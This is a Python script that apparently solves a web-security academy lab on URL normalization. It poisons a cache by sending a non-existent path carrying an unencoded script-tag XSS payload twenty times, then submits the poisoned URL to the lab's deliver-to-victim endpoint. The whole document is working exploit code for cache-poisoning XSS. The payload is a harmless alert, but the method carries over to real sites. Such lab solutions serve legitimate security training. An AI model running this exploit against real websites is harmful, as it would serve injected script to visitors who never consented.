#################################################################
#
# Lab: URL normalization
#
# Hack Steps:
#      1. Send multiple request to a non-exist path to cache it
#         with the injected payload
#      2. Deliver the link to the victim
#
#################################################################
import requests
from colorama import Fore
import urllib.request

# Change this to your lab URL
LAB_URL = "https://0a0b00a70374504d80adadd6008500f6.web-security-academy.net" 

def main():
    non_exist = "hack"; # You can change this to what you want
    payload = f"/{non_exist}<script>alert(1)</script>"
    
    # 5 times is enough for caching
    # 20 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
    for counter in range(1,21):
        print(Fore.WHITE + f"⦗1⦘ Poisoning a non-existent path with the injected payload ({counter}/20).. ", end="\r", flush=True)
        
        try:
            # urllib will not make the URL percent-encoded which is necessary to solve this lab
            urllib.request.urlopen(f"{LAB_URL}{payload}")
        except:
            continue
   
    print(Fore.WHITE + "⦗1⦘ Poisoning a non-existent path with the injected payload (20/20).." + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The path is poisoned successfully")
    print(Fore.WHITE + "⦗2⦘ Delivering the link to the victim..", end="", flush=True)
    
    data = { "answer": f"{LAB_URL}{payload}" }
    post_data("/deliver-to-victim", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)

if __name__ == "__main__":
    main()